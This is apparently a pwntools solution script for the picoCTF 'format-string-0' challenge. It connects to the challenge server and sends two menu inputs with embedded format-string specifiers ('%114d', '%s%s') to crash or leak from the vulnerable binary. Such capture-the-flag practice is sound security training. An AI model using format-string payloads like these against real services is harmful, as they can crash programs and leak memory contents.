import pwn

# io = pwn.process("./format-string-0")
io = pwn.remote("mimas.picoctf.net", 60248)

io.sendline(b"Gr%114d_Cheese")
io.sendline(b"Cla%sic_Che%s%steak")

io.info(io.recvall())
